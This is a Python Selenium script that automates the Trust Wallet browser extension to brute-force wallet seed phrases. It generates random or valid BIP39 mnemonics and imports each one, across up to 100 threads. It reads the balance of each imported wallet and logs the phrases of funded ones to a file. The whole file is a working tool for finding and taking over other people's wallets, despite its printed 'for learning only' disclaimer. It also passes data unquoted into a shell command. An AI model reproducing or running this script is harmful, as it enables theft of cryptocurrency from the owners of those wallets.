from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import subprocess
import random
import logging
import sys
import os
import threading

def copy2clip(txt):
    cmd='echo '+txt.strip()+'|clip'
    return subprocess.check_call(cmd, shell=True)


logging.getLogger('selenium.webdriver.common.selenium_manager').setLevel(logging.ERROR)
from mnemonic import Mnemonic
# 校验助记词是否合法
def is_valid_mnemonic(mnemonic):
    mnemo = Mnemonic("english")
    return mnemo.check(mnemonic)
def load_wordlist():
    with open("english.txt", "r") as file:
        words = file.read().splitlines()
    return words
def generate_mnemonic2():
    mnemo = Mnemonic("english")
    # 生成随机种子
    seed = os.urandom(16)  # 使用 16 字节的随机种子
    # 生成24个助记词
    mnemonic = mnemo.to_mnemonic(seed)
    return mnemonic
# 随机生成12个助记词
def generate_mnemonic():
    wordlist = load_wordlist()  # 加载单词表
    mnemonic = " ".join(random.choice(wordlist) for _ in range(12))  # 随机选择12个单词
    return mnemonic
# 获取 BSC 配置

count22 = 0
js = "arguments[0].click();"
def CHENGXU(auth_code1):


   
    while True:
        try:
            opt = Options()
            opt.add_argument("--disable-gpu")
            opt.add_argument("--no-sandbox")
            opt.add_argument("--disable-dev-shm-usage")
            opt.add_argument("--disable-software-rasterizer")
            opt.add_argument("--window-size=400,800")
            opt.add_argument("--force-device-scale-factor=0.6")
            opt.add_extension(EXTENSION_PATH)
            driver = webdriver.Chrome(options=opt)
            WebDriverWait(driver, 15).until(EC.new_window_is_opened(driver.window_handles))
            driver.switch_to.window(driver.window_handles[1])

            try:
                time.sleep(5)
                elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[2]/div[2]/div/div/div/div/div[3]/div/div/div[2]/p[1]')))
                # 执行点击操作
                driver.execute_script(js, elem)
            except:

                driver.refresh()  # 刷新页面
                elem = WebDriverWait(driver, 20).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[2]/div[2]/div/div/div/div/div[3]/div/div/div[2]/p[1]')))
                # 执行点击操作
                driver.execute_script(js, elem)
            time.sleep(0.1)
            #输入密码
            driver.find_element(by = By.XPATH, value = '//*[@id="root"]/div[3]/div/div/div[2]/form/div[1]/div/div/input').send_keys(password) #enter pass
            driver.find_element(by = By.XPATH, value = '//*[@id="root"]/div[3]/div/div/div[2]/form/div[2]/div/div/input').send_keys(password) #enter pass2
            #同意协议
            elem = driver.find_element(by = By.XPATH, value= '/html/body/div/div[3]/div/div/div[2]/form/div[3]/div/input').click() 
            #下一步
            time.sleep(0.01)
            elem = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[3]/div/div/div[2]/form/div[4]/div[2]')))
            elem.click()
            
        
            #输入助记词
            if auth_code1== "2":
                while True:
                    mnemonic = generate_mnemonic2()
              
                    if is_valid_mnemonic(mnemonic):
              
                        
                        break
            else:
                mnemonic = generate_mnemonic()
            copy2clip(mnemonic)
    
            elem = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[2]/div/div[2]/div/div/div[2]/form/div[1]/div[2]/div[1]/div[1]/div/input')))         
            elem.send_keys(Keys.CONTROL + 'v')
            time.sleep(1)
            
            while True:

                try:
                    elem = driver.find_element(by = By.XPATH, value= '/html/body/div/div[2]/div/div[2]/div/div/div[2]/form/div[1]/div[4]/div/div')

                    mnemonic = generate_mnemonic()
                
                    
                    copy2clip(mnemonic)
                    
                    elem = driver.find_element(by = By.XPATH, value= '/html/body/div/div[2]/div/div[2]/div/div/div[2]/form/div[1]/div[2]/div[1]/div[1]/div/input')
                
                    elem.send_keys(Keys.CONTROL + 'v')
                except Exception as e:
                    
                    #密码正确#下一步
                    
                    try:
                        elem = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[2]/div/div[2]/div/div/div[2]/form/div[2]/div[2]')))
                        # 执行点击操作
                        elem.click()
                    except:
                        elem = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[2]/div/div[2]/div/div/div[2]/form/div[1]/div[4]/div/div')))
                        # 执行点击操作
                       

                        mnemonic = generate_mnemonic()
                        copy2clip(mnemonic)
                        elem = driver.find_element(by = By.XPATH, value= '/html/body/div/div[2]/div/div[2]/div/div/div[2]/form/div[1]/div[2]/div[1]/div[1]/div/input')
                        elem.send_keys(Keys.CONTROL + 'v')
                    
                    try:
                        #不，谢谢
                        elem = WebDriverWait(driver, 5).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[3]/div/div/div/div[2]/div[1]/button/p')))
                        # 执行点击操作
                        elem.click()

                        elem = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[3]/div/div/div/div[2]/div/button')))
                        # 执行点击操作
                        elem.click()
                        elem = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[2]/div/div/div/div[2]/div/div/div[2]/div/div[5]/div/button')))
                        # 执行点击操作
                        elem.click()
                        elem = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[2]/div/div/div/div[2]/div/div/div[2]/div/div[5]/div/button')))
                        # 执行点击操作
                        elem.click()
                    except:

                        elem = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[3]/div/div/div/div[2]/div/button')))
                        # 执行点击操作
                        elem.click()
                        
                    time.sleep(5)
                    elem = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[2]/div[2]/div[1]/div[1]/h2')))
                    usd1 = elem.text.split()
                
                  
                    
                    price_str = usd1[0]
                    price_str = price_str.replace('[', '').replace(']', '').replace("'", '').replace('$', '').strip()
                    # 将处理后的字符串转换为浮点数
                    price_float = float(price_str)
                    print(f"助记词:{mnemonic}  余额:{usd1}")
            
                    if  price_float>0:
                        logging.basicConfig(filename=log_file_path2, level=logging.INFO)                
                        # 在控制台输出和写入日志文件
                        logging.info(f'Trust" :{mnemonic} "余额":{usd1}')    
    
                    else:
                        logging.basicConfig(filename=log_file_path, level=logging.INFO)                
                        # 在控制台输出和写入日志文件
                        logging.info(f'Trust" :{mnemonic} "余额":{usd1}')  

                    for handler in logging.root.handlers[:]:
                        handler.close()  # 关闭处理器
                        logging.root.removeHandler(handler)  # 移除处理器
            
                    elem = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[2]/div[1]/div[1]/button/div/div[2]/p')))
                    elem.click()
        
                    #添加钱包
                    elem = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[2]/div[1]/div[1]/div/div[2]/div[1]/button/p')))
                    elem.click()
            
                    #导入或者恢复钱包
                    elem = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[2]/div[2]/div/div/div/div/div[3]/div/div/div[2]/p[1]')))
                    elem.click()
                    #输入密码
                    driver.find_element(by = By.XPATH, value = '/html/body/div/div[3]/div/div/div[2]/form/div[1]/div/div/input').send_keys(password) #enter pass2
                    time.sleep(1)
                    #点击下一步
                    elem = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[3]/div/div/div[2]/form/div[2]/div[2]/button')))
                    elem.click()


                    #输入助记词
                    if auth_code1== "2":
                        while True:
                            mnemonic = generate_mnemonic2()
                            
                            if is_valid_mnemonic(mnemonic):
                                break
                    else:
                        mnemonic = generate_mnemonic()
                    copy2clip(mnemonic)
            
                    elem = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[2]/div/div[2]/div/div/div[2]/form/div[1]/div[2]/div[1]/div[1]/div/input')))         
                    elem.send_keys(Keys.CONTROL + 'v')
                    time.sleep(1)
    
        except:
            driver.quit()
mmdrza = '''
声明：本程序仅供学习，请勿用于非法用途。                                                                                                 
'''
print(mmdrza)
password = "Aa123456!"

#打包文件路径
script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))

# 运行 c2demo.exe 并传递参数
EXTENSION_PATH = os.path.join(script_dir, "TrustWallet.crx")
log_file_path=os.path.join(script_dir, "TrustWallet钱包余额记录.txt")
log_file_path2=os.path.join(script_dir, "TrustWallet钱包有钱余额记录.txt")

print("程序正在启动中！")


    
while True:
    auth_code1 = input("请选择：1、单开模式 2、多开模式（点击Enter确认）: ")
    if auth_code1 in ("1", "2"):
        break
    print("请输入数字1或者数字2进行选择！")

if auth_code1 == "2":
    while True:
        auth_code2 = input("请输入多开数量（1~100）（点击Enter确认）: ")
        if auth_code2.isdigit() and 1 <= int(auth_code2) <= 100:
            auth_code2 = int(auth_code2)
            break
        print("请输入数字1~100！")

    # 多进程启动多个 CHENGXU()
    threads = []
    for _ in range(auth_code2):
        
        p = threading.Thread(target=CHENGXU, args=(auth_code1))
        p.daemon= True
        p.start()
        threads.append(p)
        time.sleep(2)
    # 等待所有进程完成（可选）
    while True:
        time.sleep(1)

else:
    CHENGXU(auth_code1)  # 单开模式直接运行一次


